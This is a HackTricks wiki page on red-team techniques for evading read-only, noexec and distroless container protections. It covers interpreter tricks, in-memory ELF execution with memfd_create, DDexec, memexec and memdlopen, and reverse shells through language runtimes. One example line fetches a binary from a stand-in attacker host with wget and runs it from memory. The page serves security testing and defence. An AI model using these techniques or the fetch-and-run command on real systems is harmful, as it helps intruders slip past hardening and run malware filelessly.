---
title: "Bypass FS protections: read-only / no-exec / Distroless"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/linux-hardening/linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/index.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: linux
---

## Videos

In the following videos you can find the techniques mentioned in this page explained more in depth:[\[1\]](#references)[\[2\]](#references)

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4) .<sup>[\[1\]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU) .<sup>[\[2\]](#references)</sup>

## read-only / no-exec scenario

In a container, you can mount the root filesystem as read-only by setting **`readOnlyRootFilesystem: true`** in the security context.<sup>[\[3\]](#references)</sup> For example:

```
apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
```
      **readOnlyRootFilesystem: true**
    command: ["sh", "-c", "while true; do sleep 1000; done"]
A read-only root does not make separately mounted volumes read-only. Docker treats **`/dev/shm`** as an IPC mount, while tmpfs options such as `rw` and `noexec` are runtime configuration choices; inspect the target container’s mount options before relying on either behavior.[\[4\]](#references)[\[5\]](#references)

Warning

From a red-team perspective, that combination can make it difficult to download and execute binaries that are not already available (for example, backdoors or enumeration tools).[\[4\]](#references)[\[5\]](#references)

## Easiest bypass: Scripts

A `noexec` mount blocks direct execution of binaries on that mount, but an interpreter can still read and interpret a script. If `sh` or `python` is present, you can therefore run a shell or Python script through that interpreter.[\[5\]](#references)

This does not help when the required tool is itself a binary.[\[5\]](#references)

## Memory Bypasses

When direct execution from a mounted path is blocked, one option is to load the ELF into memory and execute it through an in-memory path. This avoids the `noexec` check on that mount, but does not remove other kernel, permission, or policy controls.[\[5\]](#references)[\[6\]](#references)

### FD + exec syscall bypass

If a scripting runtime can access the relevant Linux interface, it can create an anonymous, RAM-backed file descriptor with **`memfd_create(2)`**, write the ELF bytes to it, and use an fd-backed execution path. The project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) generates compressed and base64-encoded Python, Perl, or Ruby code for this workflow.[\[6\]](#references)[\[7\]](#references)

The project currently documents Python, Perl, and Ruby targets; PHP or Node need a different runtime-specific technique or extension, so the absence of this generator for a language does not mean that in-memory execution is impossible.[\[6\]](#references)[\[12\]](#references)

Warning

A regular executable written to **`/dev/shm`** remains subject to that mount’s **`noexec`** setting; merely opening it through an ordinary file descriptor does not change the mount policy.[\[5\]](#references)

The exact memory-execution method also depends on the runtime, architecture, kernel, and available permissions.[\[6\]](#references)[\[7\]](#references)[\[12\]](#references)

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) writes a stager and loader into the running shell process through **`/proc/self/mem`**, then transfers control to that code.[\[8\]](#references)

This lets the process load a supplied binary without first placing that binary on an executable filesystem.[\[8\]](#references)

**DDexec / EverythingExec** can load and **execute** shellcode or a binary from **memory**.[\[8\]](#references)

```
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is a daemonized DDexec implementation. Its daemon listens for requests containing arguments and raw program bytes, forks a child to load and run each program, and keeps the parent as the server.[\[9\]](#references)

The repository includes an example of using **memexec to execute binaries from a PHP reverse shell** in [a.php](https://github.com/arget13/memexec/blob/main/a.php).[\[9\]](#references)

### Memdlopen

With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) is a fileless `dlopen()` implementation for a shared object or program. Its README currently documents ARM64 support, so check the target architecture before using it.[\[10\]](#references)

## Distroless Bypass

For a dedicated explanation of **what distroless actually is**, when it helps, when it does not, and how it changes post-exploitation tradecraft in containers, check:

### What is distroless

Distroless images contain only the application and its runtime dependencies; the official images omit package managers, shells, and other programs expected in a standard Linux distribution.[\[11\]](#references)

Keeping the runtime image to those dependencies reduces the software present in production and the amount that must be scanned and tracked.[\[11\]](#references)

### Reverse Shell

In a distroless container you might **not find `sh` or `bash`** for a regular shell, nor common utilities such as `ls`, `whoami`, or `id`.[\[11\]](#references)

Warning

Therefore, a usual shell-based reverse shell or utility-based enumeration may not work.[\[11\]](#references)

If the compromised application includes a language runtime (for example, Python for a Flask application or Node.js for a Node application), an RCE may still be able to use that runtime for a command channel and system inspection through its APIs.[\[11\]](#references)[\[12\]](#references)

Use the available scripting language to **enumerate the system** through its language capabilities.[\[12\]](#references)

If there are no **read-only/no-exec** protections, a command channel may write binaries to a writable, executable mount and run them; verify the mount options and permissions first.[\[4\]](#references)[\[5\]](#references)

When these protections are present, use the **memory-execution techniques above** where the runtime, kernel, and permissions allow.[\[6\]](#references)[\[8\]](#references)[\[10\]](#references)

You can find **examples** of exploiting RCE vulnerabilities to obtain scripting-language **reverse shells** and execute binaries from memory in [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).[\[12\]](#references)

## References

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
